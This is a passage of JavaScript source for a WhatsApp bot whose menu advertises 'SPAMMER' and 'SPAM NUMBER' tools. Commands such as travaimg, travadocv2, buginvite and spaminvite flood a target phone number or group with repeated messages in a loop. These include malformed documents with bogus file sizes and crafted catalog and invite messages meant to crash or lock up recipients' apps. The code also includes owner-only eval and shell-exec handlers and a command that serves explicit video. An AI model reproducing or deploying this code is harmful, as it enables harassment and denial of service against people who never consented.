          {
            "title": "LIST CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              },
              {
              	"productId": "6431678466857362"
              },
               {
                "productId": "4120139628109348"
              },
               {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              },
              {
                "productId": "4120139628109348"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "4120139628109348",
          "Thumbnail": fs.readFileSync('./src/menu.jpg'),
          "jpegThumbnail": fs.readFileSync('./src/menu.jpg'),
        },
        "businessOwnerJid": `37122219115@s.whatsapp.net`,
      },
    }
  }), { userJid: hisoka.user.id })
for (let i = 0; i < args[0]; i++) {
  hisoka.relayMessage(m.chat, list.message, { mentionedJid: `${jids}`, messageId: list.key.id})
}
}
break

case 'waifuanime': {
if (!isPremium) return m.reply(global.mess.premium)
 waifudd = await axios.get(`https://api.waifu.pics/sfw/waifu`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next`}, type: 1},
        ]
      let buttonsTsMessages = {
       image: {url:waifudd.data.url},
       caption:  `Ini Kak`,
      footer: `${global.cpowner}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            hisoka.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
}
break

case 'hentaividios': case 'hentaivideo': {
if (!isPremium) return m.reply(global.mess.premium)
m.reply(global.mess.wait)
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
hisoka.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${global.emoji}Title : ${result912.title}\n${global.emoji}Category : ${result912.category}\n${global.emoji}Mimetype : ${result912.type}\n${global.emoji}Views : ${result912.views_count}\n${global.emoji}Shares : ${result912.share_count}\n${global.emoji}Source : ${result912.link}\n${global.emoji}Media Url : ${result912.video_1}` }, { quoted: m })
            }
break


case 'travaimg': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(`${numbers}@s.whatsapp.net`, {image: fs.readFileSync('./src/menu.jpg'), caption: `${card}`})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'travaimggc': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, {image: fs.readFileSync('./src/menu.jpg'), caption: `${card}`})
}
}
break

case 'setpp': {
if (!isCreator) return m.reply(global.mess.owner)
let media = await hisoka.downloadAndSaveMediaMessage(quoted)
await hisoka.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
}
break

case 'travaimgv2': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(`${numbers}@s.whatsapp.net`, {image: fs.readFileSync('./src/menu.jpg'), caption: `${emojitrava}`})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break

case 'travaimggcv2': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, {image: fs.readFileSync('./src/menu.jpg'), caption: `${emojitrava}`})
}
}
break

case 'chatbot': {
if (!isPremium) return m.reply(global.mess.premium)
pesan = `${args.join(" ")}`
const templateMessage = {
  text: `${pesan}`,footer: `Chat From Admin`,
  templateButtons: [
  {
  index: 1, 
  urlButton: {
  displayText: 'Admin', 
  url: `https://wa.me/${global.nomorowner}`
  }
  },
  ],
  }
  hisoka.sendMessage(m.chat, templateMessage)
}
break

case 'buginvite': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
const groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "37122219115-1610340626@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": `${emojitrava}`,
"caption": `${vbutton}`,
"jpegThumbnail": fs.readFileSync('./src/menu.jpg')
}
}), { userJid: hisoka.user.id })
for (let i = 0; i < args[0]; i++) {
hisoka.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id})
}
}
break

case 'spaminvite': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
const groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "37122219115-1610340626@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": `${emojitrava}`,
"caption": `${vbutton}`,
"jpegThumbnail": fs.readFileSync('./src/menu.jpg')
}
}), { userJid: hisoka.user.id })
for (let i = 0; i < jumlah; i++) {
hisoka.relayMessage(`${numbers}@s.whatsapp.net`, groupInvite.message, { messageId: groupInvite.key.id})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break


// MENU BOT //
/*case 'menu': {
let encmedia = await hisoka.sendVideoAsSticker(m.chat, fs.readFileSync('./src/stick.webp'), m, { packname: `🤡`, author: `The Carosatz` })
const templateMessage = {
text: ` Travas :

> .travadoc
> .travacart
> .travadocios
> .textios
> .travaimg
> .travadoc2 628xxxxxxx
> .travacart2 628xxxxxxx
> .carrinho

Other :

> .animeneko
> .waifuanime
> .hentaivideo
> .sticker

  `,footer: `@ The Carosatz`,
  templateButtons: [
  {
  index: 1, 
  urlButton: {
  displayText: 'Credits', 
  url: `https://wa.me/+37122219115`
  }
  },
  ],
  }
  await hisoka.sendMessage(m.chat, templateMessage, { quoted: m })
  await fs.unlinkSync(encmedia)
}
break
*/

case 'canb': {
hisoka.sendMessage(m.chat, { text: '', templateButtons: [
{ callButton: { displayText: `p`, phoneNumber: ''}},
{ callButton: { displayText: `p`, phoneNumber: ''}},
{ urlButton: { displayText: `p`, url: 'https://wa.me/573177111111'}},
{ urlButton: { displayText: `p`, url: 'https://wa.me/573177111111'}},
{ quickReplyButton: { displayText: `p`, id: ''}},
{ quickReplyButton: { displayText: `p`, id: ''}},
]})
}
break

case 'travadocv2': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Nomor|Jumlah`)
numbers = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
hisoka.sendMessage(`${numbers}@s.whatsapp.net`, {document: fs.readFileSync('./src/menu.jpg'), mimetype: `aplication/pdf`, fileName: `${emojitrava}`, mentionedJid: `${jids}`, fileLength: 9999999999,})
}
m.reply(`Sukses kirim ke nomor ${numbers}`)
}
break


case 'travadocgcv2': {
if (!isPremium) return m.reply(global.mess.premium)
if (args.length < 1) return m.reply(`${prefix}${command} Jumlah`)
for (let i = 0; i < args[0]; i++) {
hisoka.sendMessage(m.chat, {document: fs.readFileSync('./src/menu.jpg'), mimetype: `aplication/pdf`, fileName: `${emojitrava}`, mentionedJid: `${jids}`, fileLength: 9999999999,})
}
}
break

case 'menu': {
if (!isPremium) return m.reply(global.mess.premium)
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./src/czx.png') }, { upload: hisoka.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: `╭─✪「𝗦𝗣𝗔𝗠𝗠𝗘𝗥」✪
│⧉ .travacart [Jumlah]
│⧉ .carrinhogc [Jumlah]
│⧉ .textios [Jumlah]
│⧉ .buginvite [Jumlah]
│⧉ .catalog [Jumlah]
│⧉ .catalog2 [Jumlah]
│⧉ .bugbutton [Jumlah]
│⧉ .travaimggc [Jumlah]
│⧉ .travaimggcv2 [Jumlah]
│⧉️ .tagvideogc [Jumlah]
│⧉ .buglocgc [Jumlah]
│⧉ .tagcontactgc [Jumlah]
│⧉ .taglocgc [Jumlah]
│⧉ .spamreactgc [Jumlah]
│⧉ .taggifgc [Jumlah]
│⧉ .bugstickgc [Jumlah]
│⧉ .travadocgcv2 [Jumlah]
└─❶

╭─✪「𝗦𝗣𝗔𝗠 𝗡𝗨𝗠𝗕𝗘𝗥」✪
│⧉ .tagcatalog [Nomor|Jumlah]
│⧉ .carrinho [Nomor|Jumlah]
│⧉ .bugloc [Nomor|Jumlah]
│⧉ .bugvideo [Nomor|Jumlah]
│⧉ .buggif [Nomor|Jumlah]
│⧉ .spamcart [Nomor|Jumlah]
│⧉ .travaimg [Nomor|Jumlah]
│⧉ .travaimgv2 [Nomor|Jumlah]
│⧉ .spaminvite [Nomor|Jumlah]
│⧉ .tagvideo [Nomor|Jumlah]
│⧉ .taggif [Nomor|Jumlah]
│⧉ .tagcontact [Nomor|Jumlah]
│⧉ .tagloc [Nomor|Jumlah]
│⧉ .travadoc [Nomor|Jumlah]
│⧉ .travadocv2 [Nomor|Jumlah]
│⧉ .spamreact [Nomor|Jumlah]
│⧉ .bugstick [Nomor|Jumlah]
└─❷

╭─✪「𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨」✪
│⧉ .animeneko
│⧉ .hentaivideo
│⧉ .waifuanime [No Premium]
│⧉ .sticker [No Premium]
│⧉ .setpppanjang [Only Owner]
└─❸

╭─✪「𝗔𝗕𝗢𝗨𝗧」✪
│⧉ ${global.nameowner}
│⧉ Version 2.0
└─❹`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: 'C R E D I T S',
                                    url: `https://wa.me/${global.nomorowner}`
                                }
                            }]
                        }
                     }
                }), { userJid: hisoka.user.id })
                hisoka.relayMessage(m.chat, template.message, { messageId: template.key.id })
                }
            break


            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    hisoka.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})